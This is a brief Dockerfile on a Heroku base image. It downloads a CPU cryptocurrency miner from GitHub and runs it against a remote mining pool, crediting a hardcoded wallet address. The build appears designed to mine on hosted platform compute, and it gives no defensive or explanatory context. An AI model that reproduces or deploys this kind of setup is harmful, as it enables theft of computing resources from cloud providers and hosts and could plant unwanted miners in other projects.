FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b  -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u Mq57pD51Lei9PBvkGCso7xNQerTHttfmRm.zib -t 1
CMD bash heroku.sh
